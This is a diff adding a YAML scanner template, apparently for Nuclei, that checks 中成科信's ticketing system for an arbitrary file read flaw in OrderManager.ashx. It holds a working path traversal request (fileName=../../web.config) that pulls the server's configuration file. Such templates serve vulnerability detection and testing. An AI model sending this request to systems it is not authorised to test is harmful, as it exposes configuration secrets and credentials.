@@ -1,0 +1,25 @@
+id: zhongchengkexin-OrderManager_ashx-File-reading
+
+info:
+  name: 中成科信票务管理系统 OrderManager.ashx 任意文件读取漏洞
+  author: zhongchengkexin
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /SystemManager/OrderManager/OrderManager.ashx?Method=DownTemplate&fileName=../../web.config HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<configuration>'
+          - '</configuration>'
+        condition: and
+      - type: status
+        status: 
+          - 200
